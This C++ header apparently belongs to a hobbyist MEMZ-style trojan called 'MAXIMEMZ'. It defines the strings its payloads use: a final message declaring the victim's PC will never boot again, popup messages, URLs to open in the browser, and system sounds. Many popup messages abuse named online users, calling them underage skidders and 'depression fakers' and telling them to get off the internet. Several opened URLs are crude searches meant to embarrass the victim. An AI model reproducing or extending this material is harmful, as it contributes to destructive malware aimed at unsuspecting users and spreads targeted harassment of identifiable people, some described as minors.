#pragma once
#include "maximemz.hpp"

// Why did I have to copy this from my note creator joke program? //
CONST CHAR cMessage[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MAXIMEMZ TROJAN.\r\nMeaning your PC will never boot up again!\r\n\r\nhttps://www.youtube.com/@sixtyfourYT";

// I had to use a special version of "rand" because the other one was stuck on the "Ass malware" part. //
CONST CHAR* cMessages[] = {
	"By @VenraTech - The attention addict she is",
	"YOUR MALWARES ARE ASS!!! GET OFF THE INTERNET DEPRESSION FAKERS!!!!\r\nIK YOUR ALTS, NOW STOP AND GET OFF THE INTERNET ONCE AND FOR ALL!!!!!!",
	"By @VenraTech Aka VenraShitCodingTech",
	"Free finale.exe Leti guyzz1!1!!",
	"Solarido Fianel Is So trash Skdi Oevr etra etd MXII",
	"Make something else other than GDI, so I won't add it here.",
	"By @VenraTech / SkidraTech",
	"No tunnel effects? - JernOfficial217",
	"For context they sent malware\r\nso watch out - Makinishi",
	"Once again, another bad trojan by @VenraTech",
	"I love NEFFEX music so much!!!",
	"DO NOT CALL JERN AT 3 AM!!! (GONE VERY VERY WRONG!!!)",
	"By @SensistR the worst 2025 skidder - FelloBoiYuuka",
	"STOP MAKING SHITTY MALWARE! - FelloBoiYuuka",
	"Skidded shit. - You know who he is", // Previously "Ew - FelloBoiYuuka" //
	"Ass malware, get out of here skidder who's 9! - FelloBoiYuuka",
	"Also you dunno maths right? @Executioner0x3f - NikoSoft", // Previously "Nomenclature sex link:\r\nhttps://github.com/FelloBoiYuuka/ToxicDatabase/blob/main/Skidded/Nomenclature.7z" //
	"How much does this guy skid? - FelloBoiYuuka",
	"Prb a VenraTech/MalwareRenders alt. - You get the idea",
	"If you're reading this @NotCCR, @VenraTech or @fedoumoffical, get of this platform and Discord since you're underage and you don't know how to code and stop faking depression.",
	"HE LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOVES ME??????",
	"I love you all reading this message",
	"This is a demonstration of the Suffocation.exe virus by Executioner. Do not do this on your main computer because you will lose all of your data and it will not boot up again and you will have to reinstall Windows to fix it. This was done on a Virtual Machine.",
	"I love skudding - camellia-y7x",
	"Finale is overrated. - NTFS Formatted",
	"bro stole my video - MalwareRecords/Calibrato",
};

CONST CHAR* cSites[] = {
	"http://google.co.ck/search?q=I+love+you+guys",
	"http://google.co.ck/search?q=unbiseptium+will+beat+finale",
	"https://www.reddit.com/r/transitiongoals/comments/120970j/nia_from_i_cant_sleep_is_my_new_gender_envygoal/", // Whoops, I triggered the I Can't Sleep fans! //
	"http://google.co.ck/search?q=finale.exe",
	"http://google.co.ck/search?q=best+ways+to+gamble",
	"http://google.co.ck/search?q=i+love+kids+so+much",
	"http://google.co.ck/search?q=hacking+no+script+kiddie+shitbfg",
	"https://www.youtube.com/watch?v=A8CuAbt9nvc&pp=0gcJCcwJAYcqIYzv", 
	"http://google.co.ck/search?q=I+Wanna+Keep+Myself+Safe",
	"http://google.pl/search?q=Poland+viruses+really+good",
	"https://www.youtube.com/watch?v=xEt1znC1pTc",
	"http://google.co.ck/search?q=Maxi=in+Videos",
	"http://google.co.ck/search?q=My+house+location",
	"http://google.co.ck/search?q=I+can't+sleep+nia",
	"http://google.co.ck/search?q=PC+speedup+2025+working",
	"http://google.co.ck/search?q=free+finale+exe+working+no+virus+2025",
	"http://google.co.ck/search?q=calm+jern+music+12+hours+live",
	"https://files.catbox.moe/xkbqrc.png",
	"https://github.com/Maxi2022gt",
	"https://www.youtube.com/@MaxiToysOfficial",
	"https://maxitoysweb.netlify.app",
	"https://www.reddit.com/user/MaxMaxMaxXD/",
	"http://play.clubpenguin.com",
	"http://pcoptimizerpro.com",
	"http://softonic.com",
};

// Sounds, only for payloads. //

CONST CHAR* cSystemSounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation",
};

CONST size_t cstSitesLength = sizeof(cSites) / sizeof(VOID*);
CONST size_t cstMessagesLength = sizeof(cMessages) / sizeof(VOID*);

CONST size_t cstSoundLength = sizeof(cSystemSounds) / sizeof(VOID*);
CONST size_t cstMessageLength = sizeof(cMessage);